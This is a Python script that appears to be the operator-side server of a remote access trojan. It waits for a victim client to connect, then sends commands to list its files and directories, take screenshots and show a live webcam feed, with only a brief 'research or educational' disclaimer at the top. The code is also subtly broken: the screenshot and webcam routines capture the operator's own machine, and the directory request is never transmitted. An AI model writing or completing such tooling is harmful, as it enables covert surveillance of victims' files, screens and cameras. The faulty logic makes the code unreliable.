'''
THIS IS NOT MEANT TO BE USED MALICIOUSLY,
ONLY USE THIS FOR REASEARCH OR EDUCATIONAL POURPOSES.
'''

import os
import sys
import socket
import pyscreenshot
import tkinter

#host = socket.gethostname()
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = socket.gethostbyname(socket.gethostname())
opensocket = True

port = 25565
ss_num = 0
w_num = 0

# Cool ascii art
print('''
                      /$$                        
                     | $$                        
  /$$$$$$  /$$$$$$  /$$$$$$    /$$$$$$  /$$   /$$
 /$$__  $$|____  $$|_  $$_/   /$$__  $$| $$  | $$
| $$  \__/ /$$$$$$$  | $$    | $$  \ $$| $$  | $$
| $$      /$$__  $$  | $$ /$$| $$  | $$| $$  | $$
| $$     |  $$$$$$$  |  $$$$/| $$$$$$$/|  $$$$$$$
|__/      \_______/   \___/  | $$____/  \____  $$
                             | $$       /$$  | $$
                             | $$      |  $$$$$$/
                             |__/       \______/ 
''')

# Connect to client
sock.bind((host, port))
print("Success: binded host and port (" + host + ":" + str(port) + ")")
print("Server is running on " + host)
print("Awaiting incoming connections")

sock.listen(1)
connection, address = sock.accept()
print(str(address) + " has connected to the server")

# Commands
def add_command(command):
    connection.send(command.encode())
    print(command + " has been sent")

while opensocket:
    command = input(str("cmd > "))
    if command == "help":
        add_command("help")
        print('''
        COMMANDS:
        - list: prints all files listed in the current directory
        - listfrom: prints all files listed in a specified directory
        - screenshot: takes a screenshot and saves it to current directory
        - help: shows a list of commands
        - endsession: closes sockets and client/server
        - showcamera: show a live feed of the webcam
        ''')

    elif command == "list":
        add_command("list")
        files = connection.recv(5000)
        files = files.decode()
        print(files)

    elif command == "listfrom":
        add_command("listfrom")
        fromdir = input(str("What directory would you like to list the files from? "))
        files = connection.recv(5000)
        files = files.decode()
        print(files)

    elif command == "screenshot":
        add_command("screenshot")
        ss = pyscreenshot.grab()

        ss.save("screenshot_" + str(ss_num) + ".png")
        ss_num = ss_num + 1

    elif command == "endsession":
        add_command("endsession")
        opensocket = False
        sock.close()
        
    elif command == "showcamera":
        add_command("showcamera")
        print("Showing live webcam")
        import tkinter as tk
        import cv2
        from PIL import Image, ImageTk

        width, height = 800, 600
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            raise Exception("Could not open video device")
        cap.set(cv2.CAP_PROP_FRAME_WIDTH, width)
        cap.set(cv2.CAP_PROP_FRAME_HEIGHT, height)

        def ss_press():
            global w_num
            ret, img = cap.read()
            cv2.imwrite('webcam_'+str(w_num)+'.png', img)
            w_num += 1

        root = tk.Tk()
        root.title("Webcam for " + str(address))
        lmain = tk.Label(root)
        lmain.pack()
        tk.Button(root, text="Close", command=root.destroy).pack()
        tk.Button(root, text="Screenshot", command=lambda: ss_press()).pack()

        def show_frame():
            _, frame = cap.read()
            frame = cv2.flip(frame, 1)
            cv2image = cv2.cvtColor(frame, cv2.COLOR_BGR2RGBA)
            img = Image.fromarray(cv2image)
            imgtk = ImageTk.PhotoImage(image=img)
            lmain.imgtk = imgtk
            lmain.configure(image=imgtk)
            lmain.after(10, show_frame)

        show_frame()
        root.mainloop()

    else:
        print("Sorry, " + command + " was not found")

sys.exit(1)